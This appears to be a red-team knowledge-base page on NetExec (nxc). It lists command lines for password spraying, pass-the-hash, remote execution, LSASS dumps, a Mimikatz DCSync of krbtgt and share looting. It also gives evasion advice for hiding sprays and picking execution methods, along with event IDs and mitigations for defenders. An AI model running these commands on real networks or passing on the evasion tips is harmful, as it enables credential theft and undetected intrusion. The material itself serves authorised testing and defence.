---
title: NetExec (nxc) — formerly CrackMapExec (cme)
type: entity
created: 2026-09-06
updated: 2026-09-07
tags: [tool, python, scanning, post-exploitation, smb, winrm, netexec]
---

# NetExec (nxc)

**NetExec** (`nxc`) is the actively maintained **mass scanning + execution**
toolkit for Windows networks. It brute-forces, enumerates, and executes across
many hosts over SMB, WinRM, LDAP, SSH, MSSQL, RDP, WMI, and more. It's the fast
way to validate creds, map local admins, check services, and push commands/dumps
across a fleet — the scanning companion to [[bloodhound]] (which plans) and
[[impacket]] (which does one target deep).

## Naming: CrackMapExec is unmaintained

- Created 2015 as **CrackMapExec** (`cme`) by byt3bl33d3r; maintained by mpgn
  (Pennyw0rth) 2019–2023.
- **September 2023**: mpgn retired as maintainer; the most active contributors
  (NeffIsBack, Marshall-Hallenbeck, zblurx) continued the project as
  **NetExec** in `Pennyw0rth/NetExec`. The original CrackMapExec repo is the
  legacy, unmaintained codebase — new work happens on NetExec.
- The canonical binary is **`nxc`**; `cme` still resolves as a legacy alias,
  but read/write `nxc` in runbooks.
- **Syntax changed**: CME subcommand modules (`cme smb <ip> lsass`) became
  **`-M` modules** (`nxc smb <ip> -M lsassy`), and the old `spider`/`mimikatz`
  subcommands are now modules/flags (`-M spider_plus`, `--spider`, `-M mimikatz`).

## Protocols

- `smb` — the workhorse: auth checks, local-admin enumeration, version/service
  checks, exec, LSASS/SAM/NTDS dumps, share spidering.
- `winrm` — auth + PowerShell remoting execution.
- `ldap` — domain/user/group enumeration, **kerberoasting/ASREProast built
  in**, delegation findings, **BloodHound ingestor**, pre2k, gMSA.
- `ssh` / `mssql` / `rdp` / `wmi` / `ftp` / `nfs` / `vnc` — other protocols.
- Execution engines: `wmiexec` / `atexec` (scheduled task) / `smbexec` —
  automatic failover in that order, or force one with `--exec-method`.

## Common invocations

```bash
# Brute / validate creds + local-admin check across a subnet
nxc smb 10.0.10.0/24 -u user -p 'P@ss' --local-auth

# Kerberos (ticket) auth
nxc smb 10.0.10.5 -u user -k

# Hash (PtH) auth
nxc smb 10.0.10.5 -u user -H <nt>

# Exec a command / PowerShell (auto wmiexec→atexec→smbexec failover)
nxc smb 10.0.10.5 -u user -p pass -x 'whoami /all'
nxc smb 10.0.10.5 -u user -p pass -X '$PSVersionTable'

# LSASS dump (lsassy is the current default; nanodump is an alternative)
nxc smb 10.0.10.5 -u user -p pass -M lsassy
nxc smb 10.0.10.5 -u user -p pass -M nanodump

# Mimikatz module (deprecated) — e.g. remote DCSync
nxc smb 10.0.10.5 -u user -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:corp /user:krbtgt"'

# Spider a share (flag) / dump all readable files (module)
nxc smb 10.0.10.5 -u user -p pass --spider C$ --pattern txt
nxc smb 10.0.10.5 -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True

# List modules / module options
nxc smb -L
nxc smb -M lsassy --options

# Reuse a stored credential from the results DB
nxc smb 10.0.10.5 -id <credID>
```

## Key flags

| Flag | Purpose |
|---|---|
| `-u` / `-p` | user / password (files allowed; `-u file -p file` = spray) |
| `-H` | NTLM hash auth (or hash file for spraying) |
| `-k` | use the current Kerberos ticket |
| `--local-auth` | local (non-domain) account |
| `-x` / `-X` | run CMD / PowerShell command |
| `--exec-method` | force wmiexec / atexec / smbexec |
| `--amsi-bypass` | PowerShell bypass file for `-X` |
| `-M` / `-o` | module + `KEY=value` options (chainable: `-M a -M b`) |
| `-id` | reuse a credential stored in the nxc DB |
| `--jitter N` / `N-M` | per-host auth throttling (spray OPSEC) |
| `--no-bruteforce` / `--continue-on-success` | spray one password against a user list |
| `-L` | list modules for a protocol |

## BloodHound integration

`~/.nxc/nxc.conf`:

```ini
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
```

nxc marks users **owned** in BloodHound as creds are found (e.g. a lsassy dump
with 20 hashes), and the `ldap` protocol has a **BloodHound ingestor** that
feeds BloodHound 2.x directly — so recon and graph-building share one pipeline.
See [[bloodhound]].

## Red-team notes (OPSEC)

- **Throttle sprays** — `--jitter 3-5` is per-host; pair with
  `--continue-on-success` + a single password to look like a legit password
  change wave, not a brute.
- **Pick the exec engine** to match the host's normal profile: `wmiexec`
  (DCOM/Sysmon 1), `atexec` (Task Scheduler 4698), `smbexec` (new service
  7045). The auto-failover is convenient but the fallback order is itself a
  tell if the first methods keep failing.
- **`-id` over re-typing** — the results DB keeps every found cred; reusing IDs
  avoids re-sending hashes/passwords on the wire and in your shell history.
- **Spider with intent** — `--spider C$ --pattern txt` is noisy on big drives;
  `spider_plus -o DOWNLOAD_FLAG=True` copies *everything*, so scope it to the
  shares you actually need.
- **`-L` first** — the module set keeps growing (spooler, iis, winscp, sccm
  dumps, LAPS defeat, schtask_as impersonation); know what's installed before
  the engagement, pin the version.

## Detection

- **4625 / 4624** — auth bursts (brute) and successful logons across many hosts.
- **SMB connection fan-out** — one source IP touching many hosts' SMB/WinRM is
  a mass-scan tell.
- **4688** — the exec command lines (`whoami`, `secretsdump`, lsassy, mimikatz).
- **Exec-engine tells** — 7045 (smbexec service), 4698 (atexec task),
  WMI/DCOM process creation (wmiexec).
- **LSASS access** (Sysmon 10) on targets hit by `lsassy`/`nanodump`.
- **Share enumeration** — SMB share listing bursts (`spider`/`spider_plus`).
- **BloodHound ingest** — an unexpected BH2 collector receiving large dumps.

## Mitigations

- **Alert on auth fan-out** — one source hitting many hosts.
- **Restrict SMB/WinRM** to expected sources; enforce signing + EPA.
- [[ad-tiering-and-hardening]] — limit what a valid low-priv cred can reach
  (nxc with a good cred still only gets what the cred allows).

## Links

- [[bloodhound]] — the planner (nxc is the scanner/executor; BH integration)
- [[impacket]] — the single-target deep tools nxc wraps
- [[lsass]] — the `lsassy`/`nanodump` dump targets
- [[pass-the-hash-and-ticket|PtH/PtT]] — the `-H` / `-k` auth modes
- [[remote-execution]] — wmiexec/atexec/smbexec mechanics
- [[mitm6]] — the network-position attacks nxc pairs with

## References

- [NetExec (GitHub)](https://github.com/Pennyw0rth/NetExec)
- [NetExec documentation](https://www.netexec.wiki/)
- [CrackMapExec (legacy, unmaintained)](https://github.com/byt3bl33d3r/CrackMapExec)
